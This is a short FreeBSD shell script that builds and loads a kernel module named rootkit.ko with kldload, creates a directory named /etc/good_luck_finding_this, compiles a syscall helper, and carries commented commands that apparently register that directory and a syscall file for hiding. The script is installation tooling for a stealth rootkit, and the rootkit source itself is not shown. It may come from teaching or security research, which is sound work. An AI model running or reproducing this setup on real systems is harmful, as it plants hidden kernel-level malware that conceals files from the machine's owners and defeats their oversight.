#!/bin/sh

make clean
make
mkdir /etc/good_luck_finding_this
kldload ./rootkit.ko

cc syscall.c -o syscall

# ./add.sh syscall_number.txt
# ./setflags.sh syscall_number.txt 01

# ./add.sh good_luck_finding_this
# ./setflags.sh good_luck_finding_this 01

